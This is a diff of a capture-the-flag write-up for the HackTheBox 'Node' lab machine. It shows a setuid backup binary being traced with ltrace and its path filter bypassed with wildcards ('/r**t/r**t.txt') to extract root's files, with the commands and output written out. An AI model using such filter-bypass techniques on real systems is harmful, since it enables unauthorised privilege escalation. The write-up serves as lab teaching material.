@@ -652,52 +652,241 @@ Trying to read `/root` directory through `/usr/local/bin/backup` file
 ```
 tom@node:/tmp$ /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root
 <e72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root                 
- [+] Finished! Encoded backup is below:
-                                                                                                                                                                                                                                                                                                                            
+ [+] Finished! Encoded backup is below                                                                                                                                                                                                                                                         
 UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==                                                        
-tom@node:/tmp$ /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root > root                                                                                                                                                                                                     
-<e72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /root > root                                                                                                                                                                                                                                                         
-tom@node:/tmp$ ls                                                                                                                                                                                                                                                                                                           
-ls                                                                                                                                                                                                                                                                                                                          
-fak3r                                                                                                                                                                                                                                                                                                                       
-linpeas.sh                                                                                                                                                                                                                                                                                                                  
-mongodb-27017.sock                                                                                                                                                                                                                                                                                                          
-root                                                                                                                                                                                                                                                                                                                        
-systemd-private-bf7239279c7e4e73a3bf5b2ff3c94cde-systemd-timesyncd.service-N576I1                                                                                                                                                                                                                                           
-test                                                                                                                                                                                                                                                                                                                        
-test-decoded                                                                                                                                                                                                                                                                                                                
-tmp                                                                                                                                                                                                                                                                                                                         
-tmux-1001                                                                                                                                                                                                                                                                                                                   
-vmware-root                                                                                                                                                                                                                                                                                                                 
-tom@node:/tmp$ cat root | base64 --decode                                                                                                                                                                                                                                                                                   
-cat root | base64 --decode                                                                                                                                                                                                                                                                                                  
-base64: invalid input                                                                                                                                                                                                                                                                                                       
-tom@node:/tmp$ cat root | base64 --decode > root-decoded                                                                                                                                                                                                                                                                    
-cat root | base64 --decode > root-decoded                                                                                                                                                                                                                                                                                   
-base64: invalid input                                                                                                                                                                                                                                                                                                       
-tom@node:/tmp$ cat root | base64 -d > root-decoded                                                                                                                                                                                                                                                                          
-cat root | base64 -d > root-decoded                                                                                                                                                                                                                                                                                         
-base64: invalid input 
-tom@node:/tmp$ ls  
-ls
-fak3r
-linpeas.sh
+ 
+```
+Then, I decided to copy this string into my attack machine and unzip it there.
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
+└─$ cat root | base64 -d > root-decoded
+                                                                                                                                                                                                                                                                                                                            
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
+└─$ file root                                                                           
+root: ASCII text, with very long lines (1524)
+
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
+└─$ file root-decoded 
+root-decoded: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
+                                                                    
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
+└─$ unzip root-decoded 
+Archive:  root-decoded
+   skipping: root.txt                need PK compat. v5.1 (can do v4.6)
+
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
+└─$ 7z x root-decoded
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD Ryzen 7 4800HS with Radeon Graphics          (860F01),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 1141 bytes (2 KiB)
+
+Extracting archive: root-decoded
+--
+Path = root-decoded
+Type = zip
+Physical Size = 1141
+
+    
+Enter password (will not be echoed):
+Everything is Ok
+
+Size:       2584
+Compressed: 1141
+                                                                                                  
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
+└─$ file root.txt    
+root.txt: ASCII text
+                                                                             
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
+└─$ cat root.txt
+QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
+QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
+QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
+QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
+QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ
+QQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ
+QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ
+QQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ
+QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ
+QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ
+QQQQQQQP'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ
+QQQQQP'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP'    "??' =QQmWWV?46/ ?QQQQQ
+QQQP'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ
+QQ[ j@mQP'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ
+QW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ
+QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ
+QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ
+QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'<mWWWWWQW?^  ` ]6QQ' yQQQQQ
+QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ
+QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ
+QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ
+QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ
+QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ
+QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ
+QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ
+QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ
+QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ
+QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ
+QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ
+QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW
+QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ
+QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ
+QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ
+QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ
+                                                                               
+```
+
+For cracking the zip file, I used the same password, that we used previously. (magicword)
+
+
+I couldn't find the root flag here, it was just a troll.
+
+Something in the backup file is intentionally preventing us from getting the root flag. So I decided to run the `ltrace` command to see what system commands are getting called when the backup program is ran.
+
+```
+__libc_start_main(0x80489fd, 4, 0xffeee914, 0x80492c0 <unfinished ...>       
+geteuid()                                        = 1000                       
+setuid(1000)                                     = 0                         
+strcmp("-q", "-q")                               = 0                         
+strncpy(0xffeee7d8, "45fac180e9eee72f4fd2d9386ea7033e"..., 100) = 0xffeee7d8 
+strcpy(0xffeee7c1, "/")                          = 0xffeee7c1                 
+strcpy(0xffeee7cd, "/")                          = 0xffeee7cd                 
+strcpy(0xffeee757, "/e")                         = 0xffeee757                 
+strcat("/e", "tc")                               = "/etc"
+strcat("/etc", "/m")                             = "/etc/m"
+strcat("/etc/m", "yp")                           = "/etc/myp"
+strcat("/etc/myp", "la")                         = "/etc/mypla"
+strcat("/etc/mypla", "ce")                       = "/etc/myplace"
+strcat("/etc/myplace", "/k")                     = "/etc/myplace/k"
+strcat("/etc/myplace/k", "ey")                   = "/etc/myplace/key"
+strcat("/etc/myplace/key", "s")                  = "/etc/myplace/keys"
+fopen("/etc/myplace/keys", "r")                  = 0x9ea3008
+fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x9ea3008) = 0xffeee36f
+strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n") = 64
+strcmp("45fac180e9eee72f4fd2d9386ea7033e"..., "a01a6aa5aaf1d7729f35c8278daae30f"...) = -1
+fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x9ea3008) = 0xffeee36f
+strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n") = 64
+strcmp("45fac180e9eee72f4fd2d9386ea7033e"..., "45fac180e9eee72f4fd2d9386ea7033e"...) = 0
+fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x9ea3008) = 0xffeee36f
+strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n") = 64
+strcmp("45fac180e9eee72f4fd2d9386ea7033e"..., "3de811f4ab2b7543eaf45df611c2dd25"...) = 1
+fgets("\n", 1000, 0x9ea3008)                     = 0xffeee36f                 
+strcspn("\n", "\n")                              = 0
+strcmp("45fac180e9eee72f4fd2d9386ea7033e"..., "") = 1                         
+fgets(nil, 1000, 0x9ea3008)                      = 0                         
+strstr("/../../etc", "..")                       = "../../etc"               
+strcpy(0xffeed3a8, "Finished! Encoded backup is belo"...) = 0xffeed3a8       
+printf(" %s[+]%s %s\n", "\033[32m", "\033[37m", "Finished! Encoded backup is belo"...) = 51                                                               
+puts("UEsDBDMDAQBjAG++IksAAAAA7QMAABgK"...)      = 1525                       
+exit(0 <no return ...>                                                       
++++ exited (status 0) +++ 
+```
+
+I’ll walk through the output in chunks.
+
+First it checks the effective user id, and then sets the uid to 0, root. Then it does a string comparison between “a” (first arg input) and “-q”:
+
+```
+__libc_start_main(0x80489fd, 4, 0xffc15284, 0x80492c0 <unfinished ...>
+geteuid()                                          = 1000
+setuid(1000)                                       = 0
+strcmp("a", "-q")                                  = 1
+```
+
+In this case that comparison returns 1 (no match). If I do pass in -q as the first arg, it just prints nothing. Maybe this is some kind of quiet mode? That was what was passed in the call from the webserver. After that, it prints the computer ascii art with a bunch of puts calls.
+
+Next the binary uses strcat to build the string /etc/myplace/keys and opens that file:
+```
+strncpy(0xff93c108, "b", 100)                       = 0xff93c108
+strcpy(0xff93c0f1, "/")                             = 0xff93c0f1
+strcpy(0xff93c0fd, "/")                             = 0xff93c0fd
+strcpy(0xff93c087, "/e")                            = 0xff93c087
+strcat("/e", "tc")                                  = "/etc"
+strcat("/etc", "/m")                                = "/etc/m"
+strcat("/etc/m", "yp")                              = "/etc/myp"
+strcat("/etc/myp", "la")                            = "/etc/mypla"
+strcat("/etc/mypla", "ce")                          = "/etc/myplace"
+strcat("/etc/myplace", "/k")                        = "/etc/myplace/k"
+strcat("/etc/myplace/k", "ey")                      = "/etc/myplace/key"
+strcat("/etc/myplace/key", "s")                     = "/etc/myplace/keys"
+fopen("/etc/myplace/keys", "r")                     = 0x9891410
+```
+
+The result of the fopen is 0x9891410, which represents a FILE object.
+
+Next there’s a series of fgets, strcspn, and strcmp calls:
+
+```
+fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x9891410) = 0xff93bc9f
+strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n")          = 64
+strcmp("b", "a01a6aa5aaf1d7729f35c8278daae30f"...)            = 1
+fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x9891410) = 0xff93bc9f
+strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n")          = 64
+strcmp("b", "45fac180e9eee72f4fd2d9386ea7033e"...)            = 1
+fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x9891410) = 0xff93bc9f
+strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n")          = 64
+strcmp("b", "3de811f4ab2b7543eaf45df611c2dd25"...)            = 1
+fgets("\n", 1000, 0x9891410)                                  = 0xff93bc9f
+strcspn("\n", "\n")                                           = 0
+strcmp("b", "")                                               = 1
+fgets(nil, 1000, 0x9891410)                                   = 0
+```
+
+strcspn with the second argument of \n gets the length of the line. Then there are strcmp calls with “b”, the second argument. This looks like a loop reading lines from the file, comparing them to the second arg. None of them match.
+
+Then it copies the “you didn’t say the magic word” string, prints it, and exits:
+```
+strcpy(0xff93acd8, "Ah-ah-ah! You didn't say the mag"...)    = 0xff93acd8
+printf(" %s[!]%s %s\n", "\033[33m", "\033[37m", "Ah-ah-ah! You didn't say the mag"... [!] Ah-ah-ah! You didn't say the magic word!)        = 58
+exit(1 <no return ...>
++++ exited (status 1) +++
+```
+
+__Note__: There are several methods we can use apply on the backup program in order to escalate privileges. I initially solved it using method 1 & method 2, however, after I watched ippsec’s video, I found out there were other ways to escalate privileges
+
+#### Method 1 — Using Wildcards
+
+The `*` character is not filtered in the program, therefore we can use it to make a backup of the root directory.
+```
+/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > root
+```
+
+Then use the same method to base64 decode and compress the file to view the flag.
+
+```
+tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > root
+tom@node:/tmp$ ls
 mongodb-27017.sock
-root   
-root-decodedsystemd-private-bf7239279c7e4e73a3bf5b2ff3c94cde-systemd-timesyncd.service-N576I1  
+root
+root.zip
+systemd-private-1c02abf426bd4b648a71de91224fe7b7-systemd-timesyncd.service-8s4yic
 test
-test-decoded  
+test-decoded
+test.html
 tmp
-tmux-1001
-vmware-root                                                                   
-tom@node:/tmp$ file root-decoded                                             
-file root-decoded                                                             
-root-decoded: empty  
+vmware-root
+tom@node:/tmp$ file root
+root: ASCII text, with very long lines, with no line terminators
+tom@node:/tmp$ cat root | base64 -d > root-decoded
+tom@node:/tmp$ file root-decoded
+root-decoded: Zip archive data, at least v1.0 to extract
+tom@node:/tmp$ unzip root.zip
+Archive:  root.zip
+   creating: root/
+[root.zip] root/.profile password:
+  inflating: root/.profile
+   creating: root/.cache/
+ extracting: root/.cache/motd.legal-displayed
+ extracting: root/root.txt
+  inflating: root/.bashrc
+  inflating: root/.viminfo
+   creating: root/.nano/
+ extracting: root/.nano/search_history
+tom@node:/tmp$ cat root/root.txt
+[REDACTED] 
 ```
 
 
-
-backup key
-```
-45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
-```
